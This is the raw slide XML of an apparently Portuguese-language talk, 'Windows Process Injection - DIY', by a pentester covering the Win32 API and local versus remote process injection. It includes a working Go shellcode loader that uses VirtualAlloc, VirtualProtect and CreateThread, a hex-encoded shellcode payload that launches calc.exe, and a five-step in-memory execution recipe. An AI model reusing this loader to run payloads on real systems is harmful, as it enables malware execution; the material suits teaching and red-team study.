                <a:effectLst/>
              </a:rPr>
              <a:t>Pointer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>oldProtect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>)))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 err="1"/>
              <a:t>virtProtect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CreateThread</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>lpStartAddress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/>
              <a:t>{</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-CA" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>   thread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CreateThread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lpStartAddress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(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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>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return </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>thread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 err="1">
                <a:solidFill>
                  <a:srgbClr val="FFC66D"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>WaitForSingleObject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>hHandle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CC7832"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>uintptr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>) {</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-CA" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>   kernel32.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B09D79"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>NewProc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/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 err="1">
                <a:solidFill>
                  <a:srgbClr val="6A8759"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>WaitForSingleObject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6A8759"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B09D79"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>Call</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>hHandle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>
                <a:solidFill>
                  <a:srgbClr val="6897BB"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>0xFFFFFF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br>
              <a:rPr lang="en-CA" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CC7832"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>func</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC7832"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC66D"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>main</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>() {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>
                <a:solidFill>
                  <a:srgbClr val="CC7832"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>payload = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6A8759"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>"fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500"</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6A8759"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6A8759"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>calculadora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/>
              <a:t>_ := </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AFBF7E"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>hex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="B09D79"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>DecodeString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(payload)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-CA" dirty="0"/>
            </a:b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calcAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t> := </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="B09D79"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>VirtualAlloc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>calculadora</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>))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RtlCopyMemory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/>
              <a:t>calculadora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VirtualProtect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>
                <a:solidFill>
                  <a:srgbClr val="CC7832"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CC7832"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>len</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>calculadora</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>))</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-CA" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>   thread := </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="B09D79"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>CreateThread</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>calcAddress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>
                <a:solidFill>
                  <a:srgbClr val="B09D79"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>WaitForSingleObject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(thread)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-CA" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-CA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DE1FB-E2F7-BB65-388D-0F97B7912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7983-DA3F-4E84-972A-686A842FDD2F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501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5584-6801-C6FA-F38C-6C72A0EBB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DAA42-F9F8-3107-29DC-37D016AE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246B5-9512-95A1-3E79-75A1D117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FCB8B-42D0-355B-FCD5-7794F167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2D4C6-8E9E-1381-C420-0C01AB2B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9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F94D-B80C-C5FF-A6CE-86C3C03F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FD1D-B2DE-6C68-CF1D-0B1D06C0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B5AF1-AB09-2228-B9AA-C7DD7A4E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F2260-09EB-6CCE-11EB-9C4AF6B2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A72E6-4F0F-DA50-13E2-1D49E68A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7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4CE4-4676-F936-7B42-80132FE68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320B9-17A4-52C4-E01E-51E3720CD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F7DBD-C45F-EF4C-3144-2868DB34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84CFC-56B1-7582-3062-BB31CB128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13EB-1418-1300-B29F-8BB37DAF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5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54C8-52AA-C4CE-136E-E8F14D0C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22DC9-475C-9C78-9FE3-DD693FC4B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F6C97-75A5-B50E-5DA8-3D1FD989E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EE751-184A-D11C-29FD-A27F5F331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6E573-1239-239D-B1D2-9C44B08C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6F4BD-AF2D-CBCD-80C0-D5B76103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3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90FB-9D14-41CD-E6BC-B102AB28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E2DA3-A0E0-74E8-AB69-6C527E34E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D9E96-4563-120B-BDF5-A223526B7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D8A44-7F25-0BAB-9DC2-E87DBED73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8C353-935F-3150-64E4-E275FAEFB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C110F-B3FA-6E5E-1C6F-F7402741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10CD5-60C3-6EA0-7FEE-89DEA3EB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D3CA5-7FBD-4A1C-9A28-4740A02F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1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68B9-9743-AB06-9051-0A442927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141E9-6FF9-60F6-8818-2D7C8DAD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1E657-504D-5BBF-7DD1-C020C5A8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48563-4A40-6BD2-A2B5-C5D40477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6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1CD08-FF2A-18CE-520A-437BE48A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4F80D-2ADF-3510-BDCC-AE733642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CD3A-7953-D98A-344E-3F5E54F8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5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862F-94C6-A210-7144-D8500DBE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3D317-F7E5-2E49-012F-EA8FA9079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BE34B-C949-1CB2-CE2C-0EAB61C9C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D2ABB-F305-2CB5-27C0-65AC3F88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9B6F2-B548-F1BE-BE6F-D0DBDB75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F22B7-D7A2-B015-B7A6-A6982395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A1C2-B347-BCF3-CE1A-C2443CE4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B253C-295E-D0DD-B086-505B34F96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8BBE6-11E1-9E0C-02DE-CE826BAC3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E2B77-B54B-04CA-714D-2E783AC7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7D84-E8C7-98EF-808E-337474E3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8CDA-74E2-B5B6-F189-846F0835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1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DEDC-7C72-D1B0-2120-178524D9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D394A-6513-F842-BD6D-088FC549C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8313-71A5-BC3E-7ECE-BD3E4548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14C61-A1BD-B354-4104-CDBBBB61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5B700-FFDD-25FE-2329-B7F04CA8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7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A17A-571F-68C8-F85B-4A5070853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77F8B-45B0-C7FE-794B-880A9D16F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B9DF6-7AD9-4D99-E39D-AA775BC5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0E96A-B14A-DC60-8D1F-ACB60980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A7C3-B488-428B-1F4D-CCF54F16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25D3A-7EA6-CA12-F79B-866C2656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F8EA5-447D-1AA9-4837-27A97A010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D43E-05F1-FDE0-5675-DC2C0506E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53ED1-DA45-45A7-BE2A-7282167F60F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BA9C1-25F4-F834-F076-6C7C464D6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148F-1E82-5A5B-3E08-FF22C55B8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6C482-6397-4DF2-B0AA-23761B490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3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windows/win32/api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truderlabs/ppid_spoof" TargetMode="Externa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9B44A-DA8C-5769-3151-E8BC44AAA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" t="10098" r="8704" b="-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F11AF-97C0-DFA6-8928-176F5E297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noProof="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Windows Process Injection - DIY</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" b="1" i="1" noProof="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AFB90-39E0-61CD-4CEA-AB9CC4C3D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" y="6317442"/>
            <a:ext cx="1587592" cy="52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3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CDE37B4-6B85-CCDA-8E2B-DAC4298F8CC9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="418641" y="512656"/>
            <a:ext cx="11644829" cy="527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CA" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>~ # </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" b="1" noProof="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>whoami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59BA2C-2A3B-DD5E-7347-8CED191F07CD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1688122" y="1346281"/>
            <a:ext cx="10375347" cy="2834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Alan (sol0) Lacerda</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="pt-BR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Atuando com Tecnologia e Segurança há mais de 20 anos</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="pt-BR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Sr. Pentester @ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA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IBLISS</a:t>
            </a:r>
            <a:endParaRPr lang="pt-BR" sz="2400" noProof="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0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="pt-BR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DCPT | OSCP | CRTP | eWPT | eWPTX | CRTO | CRTA | CRTE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="pt-BR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Background: Redes, Desenvolvimento, Sistemas Operacionais</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="pt-BR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Hobby: Desenvolvimento</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR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C2, Malware, e </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" sz="2400" noProof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Ransomware</a:t>
            </a:r>
            <a:endParaRPr lang="pt-BR" sz="24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DCC84-C84A-738D-271B-A6E943C1DDF6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10414612" y="619565"/>
            <a:ext cx="164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>
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>soualacerda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EF3BCC-9932-8E9E-9EEF-FFB3EFFE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3" t="4746"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10001609" y="604625"/>
            <a:ext cx="413003" cy="399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A989CB-06C4-730B-0731-486CE5A7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" y="4008952"/>
            <a:ext cx="3071447" cy="283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64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F11AF-97C0-DFA6-8928-176F5E297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685470"/>
            <a:ext cx="6140449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 b="1" noProof="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Conteúdo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" noProof="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CD52E-0635-9EF7-4048-EF659E16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0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E19947-B7F9-309E-1F72-57A00DAF172D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5232401" y="2313709"/>
            <a:ext cx="6140449" cy="42394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noProof="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1">
                    <a:alpha val="80000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Como o Windows cria novos processos</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="pt-BR" sz="2400" noProof="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alpha val="80000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>O que é Win32 API</a:t>
            </a:r>
            <a:endParaRPr lang="pt-BR" sz="2400" noProof="0" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1">
                  <a:alpha val="80000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="pt-BR" sz="2400" noProof="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pt-BR" sz="2400" noProof="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1">
                    <a:alpha val="80000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Como </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1">
                    <a:alpha val="80000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>criar um processo manualmente</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/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Demo em </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" noProof="0" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1">
                    <a:alpha val="80000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Golang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endParaRPr lang="pt-BR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pt-BR" sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1">
                    <a:alpha val="80000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Injeção de Processo Local vs. Remoto</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="pt-BR" sz="2400" noProof="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pt-BR" sz="2400" noProof="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1">
                    <a:alpha val="80000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Considerações Ofensivas</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2320260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AEFC8-84C9-2F1B-82A5-10A15AE3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C78B5A-6CD5-ECD7-2E39-782020C15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869" y="0"/>
            <a:ext cx="1027416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0C97A6-5A14-B4AF-8FC7-BE3DC3A3F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140" y="5636559"/>
            <a:ext cx="1316317" cy="93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4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0D8BB-9517-3689-832B-118FE774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7CB20-125A-A60D-5BEF-9FE4E5FE7F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077"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="-1116100" y="10"/>
            <a:ext cx="9669642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D1E76D-D72A-FDB0-7612-392E45712CA5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7126941" y="3115238"/>
            <a:ext cx="5183033" cy="3742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b="1" noProof="0" dirty="0"/>
              <a:t>O Windows fornece meios para você fazer isso manualmente </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" b="1" i="1" noProof="0" dirty="0"/>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" b="1" i="1" noProof="0" dirty="0" err="1"/>
              <a:t>seQuiser</a:t>
            </a:r>
            <a:endParaRPr lang="pt-BR" sz="2400" b="1" i="1" noProof="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="pt-BR" sz="2400" b="1" noProof="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" b="1" noProof="0" dirty="0"/>
              <a:t>Win32 API</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="pt-BR" sz="2400" b="1" noProof="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" b="1" noProof="0" dirty="0"/>
              <a:t>A documentação da Win32 API está no site </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" b="1" noProof="0" dirty="0" err="1"/>
              <a:t>Learn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" b="1" noProof="0" dirty="0"/>
              <a:t> MS (antigo MSDN)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="pt-BR" sz="2400" b="1" noProof="0" dirty="0">
              <a:hlinkClick r:id="rId4"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" b="1" noProof="0" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://learn.microsoft.com/en-us/windows/win32/api/</a:t>
            </a:r>
            <a:endParaRPr lang="pt-BR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408354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EF074-3C21-A229-A4BE-1D692DAF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7F73B7-39E2-8632-2440-2AA8A59825D9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5721927" y="1870363"/>
            <a:ext cx="1648691" cy="42394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011C21-5257-7182-629C-349B458DA4D1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9421092" y="1870363"/>
            <a:ext cx="1648691" cy="42394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21F54F2D-CBC1-D63C-01DD-9D1D31862F61}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="5088082" y="3713019"/>
            <a:ext cx="713507" cy="55418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3A41E8-BC76-9EF0-658F-DCEB27DECD2C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1932709" y="1870363"/>
            <a:ext cx="1648691" cy="423949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/>
              <a:t>Aplicações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A96AE7-2A07-069F-7C47-D47192A43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219" y="2416464"/>
            <a:ext cx="1228435" cy="41550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4133035D-2EA2-110E-D834-196FC8B5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pt-BR" b="1" noProof="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Corbel" panose="020B0503020204020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Comunicação Win32 API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8660EA-4131-AE20-864C-E1F5F7E2D4B2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5884071" y="4447309"/>
            <a:ext cx="1398332" cy="646331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pt-BR" noProof="0" dirty="0"/>
              <a:t>Gerenciador </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>de memoria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D1EFCD-533C-40E9-98DF-D186E88024EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4283940" y="288865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Win32 API</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="76707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56D5AB-48EB-B5A0-240E-831CA933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46"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="-4251188" y="10"/>
            <a:ext cx="9669642" cy="6857990"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:effectLst>
            <a:glow>
              <a:schemeClr val="tx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F85229D-D265-C5DF-818E-95273569BA88}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5542596" y="354239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Do it Yourself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58CE84-4C68-2F9B-8FD5-FCD9ED1D01B8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5125018" y="1898596"/>
            <a:ext cx="6849267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1800" noProof="0" dirty="0"/>
              <a:t>1. Alocar espaço na memória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2. Garantir que temos permissão de escrita nesse espaço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3. Copiar para a memória o código a ser executado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4. Garantir que o espaço tem permissão de execução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5. Executar o código em memória</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="pt-B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339156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DB06E-5C1C-02ED-902A-0033085D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16D159-132B-F33B-E96A-22F80DD0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46"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="-4251188" y="10"/>
            <a:ext cx="9669642" cy="6857990"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:effectLst>
            <a:glow>
              <a:schemeClr val="tx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BBF0AAC-4C6D-8F80-9339-54A8C5DBBDB1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5542596" y="354239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Do it Yourself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659B89-6442-F5C4-41D6-FC75DAA8A8C3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5125018" y="1898596"/>
            <a:ext cx="6849267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1800" noProof="0" dirty="0"/>
              <a:t>1. Alocar espaço na memória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2. Garantir que temos permissão de escrita nesse espaço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3. Copiar para a memória o código a ser executado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4. Garantir que o espaço tem permissão de execução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5. Executar o código em memória</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="pt-B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96055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741C6-8682-F22F-1ADC-499C8F97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7A37C45-7F5E-F8CA-70F3-A08620B38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4DF106-1219-710E-FE19-D7D76558F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46"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="-4251188" y="10"/>
            <a:ext cx="9669642" cy="6857990"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:effectLst>
            <a:glow>
              <a:schemeClr val="tx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98341D2-2966-8B88-D67C-CB0226C4C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C14C0E-BCBF-C8C8-0401-E78338526F15}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5542596" y="354239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Do it Yourself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1B947C-002A-F2E5-ABED-F99A73599416}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
